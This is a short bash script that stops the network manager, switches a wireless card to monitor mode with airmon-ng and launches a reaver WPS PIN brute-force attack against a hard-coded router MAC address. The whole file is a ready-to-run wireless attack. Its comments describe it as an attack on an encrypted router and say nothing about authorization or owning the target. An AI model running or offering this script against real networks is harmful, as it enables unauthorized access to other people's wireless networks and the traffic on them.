#!/bin/bash
# Attempts to reconfigure the network card to monitoring mode.
# Then performs WPS attack on an encrypted router.
# It is responsibility of the user to ensure the target is using WPS.

WLAN_NAME="wlan0"
TARGET_MAC="10:FE:ED:DE:B5:18"

# Quit the script after first error.
# Note that this must not be relied on:
# http://mywiki.wooledge.org/BashFAQ/105
set -e

# Echo commands as they are executed and expan variables.
set -v
set -x

# Recover to using the internet.
cleanup()
{
    sudo airmon-ng stop mon0
    sudo service network-manager start
}

# Trap Ctrl+C to perform cleanup.
# Trap errors.
trap cleanup SIGINT SIGTERM
trap 'echo error on line ${LINENO}' ERR

sudo service network-manager stop
sudo airmon-ng check kill
sudo airmon-ng start $WLAN_NAME
sudo reaver -i mon0 -b $TARGET_MAC
